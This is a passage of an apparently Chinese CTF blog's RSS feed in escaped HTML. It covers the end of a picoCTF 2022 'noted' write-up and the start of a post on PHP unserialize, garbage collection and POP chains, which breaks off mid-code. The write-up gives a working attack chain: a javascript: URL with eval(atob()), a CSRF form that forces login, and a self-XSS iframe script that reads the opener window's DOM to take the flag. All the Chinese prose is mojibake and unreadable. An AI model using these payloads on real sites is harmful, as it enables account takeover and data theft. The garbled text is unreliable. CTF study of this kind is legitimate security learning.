&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;URL has been reported.&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨notes.ejsä¸­ç”¨&lt;code>&amp;lt;%- something %&amp;gt;&lt;/code>çš„æ¨¡æ¿å½¢å¼è¾“å‡ºå†…å®¹&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-ejs" data-lang="ejs">&amp;lt;h2&amp;gt;&amp;lt;%- note.title %&amp;gt;&amp;lt;/h2&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;%- note.content %&amp;gt;&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥åšåˆ°self-xssï¼Œæˆ‘ä»¬è”æƒ³åˆ°csrf+xssçš„å¸¸è§æ‰“æ³•ï¼šxssä¸€ä¸ªcsrfçš„å†…å®¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„ç™»å½•è´¦å·çš„è¡¨å•ï¼›ä½†æ˜¯flagæ˜¯åœ¨éšæœºè´¦å·ä¸­ï¼Œè¦xsså¿…é¡»ä¹Ÿè¦†ç›–cookie&lt;/p>
&lt;p>è”æƒ³TBDXSSé‚£ä¸ªé¢˜ç›® ä¸¤ä¸ªtabä¹‹é—´å®ç°å†…å®¹çš„è¯»å–ï¼šå¦‚æœwindow A Béƒ½æœ‰ç›¸åŒçš„document.domainï¼Œåªè¦æœ‰window referenceå°±å¯ä»¥è¯»å–å¦ä¸€ä¸ªwindowçš„DOMå†…å®¹ï¼›æ‰€ä»¥åªè¦è®©Aæ˜¯POST loginä¹‹å‰çš„é¡µé¢ï¼ŒBæ˜¯self-xssçš„é¡µé¢ï¼Œè¯»å–Açš„DOMå°±å¯ä»¥æ‹¿åˆ°flag&lt;/p>
&lt;p>å¦å¤–æ³¨æ„ä¸€ä¸‹report.jsä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬çš„urlåŠ wafï¼Œæ‰€ä»¥&lt;code>javascript:alert(1)&lt;/code>ä¹‹ç±»çš„urlä¹Ÿèƒ½åœ¨&lt;code>about:blank&lt;/code>ä¸Šxss æˆ–è€…å¼€æ–°çš„windowæ„æˆcsrfï¼Œæ¯”å¦‚åƒ&lt;code>javascript:eval(atob(xxxx))&lt;/code>è¿™æ ·æ“ä½œjså†…å®¹&lt;/p>
&lt;p>å…³äºflagçš„å›æ˜¾ï¼Œç”±äºbotä¸å‡ºç½‘ï¼Œæˆ‘ä»¬è€ƒè™‘åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œå°†flagç”¨self-xss+iframeçš„æ–¹å¼ä¼ å›æ¥&lt;/p>
&lt;p>æäº¤urlï¼Œç”¨&lt;code>javascript:&lt;/code>å½¢å¼çš„url åŒ…å«ä¸€ä¸ªcsrfçš„è¡¨å•ï¼Œå¼ºåˆ¶ç™»å…¥æˆ‘ä»¬çš„è´¦å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">csrf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;form name=frm action=&amp;#39;http://0.0.0.0:8080/login&amp;#39; method=post&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;input name=username value=supernene&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;input name=password value=supernene&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">`&lt;/span> &lt;span style="color:#75715e">// ç™»å…¥æˆ‘ä»¬çš„å·²çŸ¥è´¦æˆ·
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">js&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">win = window.open(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">win.document.body.innerHTML = atob(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">csrf&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">win.document.frm.submit()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">location.href = &amp;#39;http://0.0.0.0:8080&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">`&lt;/span> &lt;span style="color:#75715e">// åœ¨about:blanké¡µé¢æ“ä½œ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`javascript:eval(atob(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">js&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;))`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç™»å…¥çš„æˆ‘ä»¬çš„è´¦å·ä¸­å«æœ‰å¦‚ä¸‹çš„self-xss payloadï¼Œè¯»å–ä¹‹å‰boté¡µé¢ä¸­çš„flagï¼Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/new&amp;#34;&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">frm&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opener&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">textContent&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">frm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">()=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">frm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">newfrm&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">frm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">contentDocument&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">forms&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// ç¡®ä¿new tab
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">newfrm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">title&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;FLAG&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">newfrm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">newfrm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/#noted">wp1&lt;/a> | &lt;a href="https://github.com/dtreplin/ctf-writeups/blob/main/picoCTF_2022_web_exploitation_noted.md">wp2&lt;/a>&lt;/p></description></item><item><title>phpååºåˆ—åŒ–ä¸­çš„æŠ¥é”™&amp;GCä¸äºŒæ¬¡åºåˆ—åŒ–é—®é¢˜</title><link>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</link><pubDate>Sun, 24 Apr 2022 21:42:33 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</guid><description>&lt;h2 id="æŠ¥é”™gcç›¸å…³é—®é¢˜">æŠ¥é”™&amp;amp;GCç›¸å…³é—®é¢˜&lt;/h2>
&lt;p>PHPæ˜¯å­˜åœ¨GCçš„è¯­è¨€ï¼Œè€Œååºåˆ—åŒ–å¯¹è±¡æ—¶çš„&lt;code>__destruct&lt;/code>å°±æ˜¯å¯¹å·²newå¯¹è±¡çš„å›æ”¶ï¼Œä¸€ä¸ªå°æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__construct&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__destruct&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 1__construct&amp;lt;/br&amp;gt;1__destruct&amp;lt;/br&amp;gt;2__construct&amp;lt;/br&amp;gt;3__construct&amp;lt;/br&amp;gt;3__destruct&amp;lt;/br&amp;gt;2__destruct&amp;lt;/br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“ä¸‹é¢çš„ä¸‰è¡Œä»£ç å‡å’Œç¬¬ä¸€è¡Œä¸€æ ·ï¼Œæ— å¼•ç”¨å’ŒæŒ‡å‘ï¼Œé‚£ä¹ˆéƒ½å°†ä¼šæ˜¯ä¾æ¬¡çš„construct+destructï¼Œä½†æ˜¯åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰å¯¹è±¡1æ²¡æœ‰å¼•ç”¨å’ŒæŒ‡å‘ æ‰€ä»¥åªæœ‰å®ƒåˆ›å»ºåç«‹åˆ»å›æ”¶ï¼›å†çœ‹ä¸‹é¢è¿™ä¸¤ç§æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 1__construct&amp;lt;/br&amp;gt;1__destruct&amp;lt;/br&amp;gt;2__construct&amp;lt;/br&amp;gt;3__construct&amp;lt;/br&amp;gt;3__destruct&amp;lt;/br&amp;gt;2__destruct&amp;lt;/br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $c[0] = $c[1];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 1__construct&amp;lt;/br&amp;gt;2__construct&amp;lt;/br&amp;gt;3__construct&amp;lt;/br&amp;gt;3__destruct&amp;lt;/br&amp;gt;2__destruct&amp;lt;/br&amp;gt;1__destruct&amp;lt;/br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”å¾ˆå¥½ç†è§£ï¼šæ— å˜é‡æŒ‡å‘çš„newçš„å¯¹è±¡åˆ›å»ºåå³å›æ”¶ï¼Œæœ‰æŒ‡å‘çš„æŒ‰åˆ›å»ºæ—¶é—´å€’åºå›æ”¶ï¼ˆå…ˆåˆ›å»ºçš„æœ€åå›æ”¶&lt;/p>
&lt;p>é—®é¢˜çš„å…³é”®åœ¨äºå¯èƒ½æ¥æ…å±€çš„&lt;code>throw new Exception();&lt;/code>ï¼Œæ¯”å¦‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨è¿™ç§æƒ…å†µä¸‹ç¨‹åºå¼‚å¸¸æŠ¥é”™é€€å‡ºï¼Œæˆ‘ä»¬popé“¾ä¸­é‡è¦çš„&lt;code>__destruct&lt;/code>ä¸ä¼šæ‰§è¡Œï¼ˆå®ƒåœ¨å¯¹è±¡æ­£å¸¸é”€æ¯æ—¶è¢«æ‰§è¡Œï¼‰ï¼Œæ¯”å¦‚ä¸€ä¸ªå¾ˆç®€å•çš„popé“¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">errorr0&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;hello __destruct&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">errorr1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;hello __toString&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">errorr2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
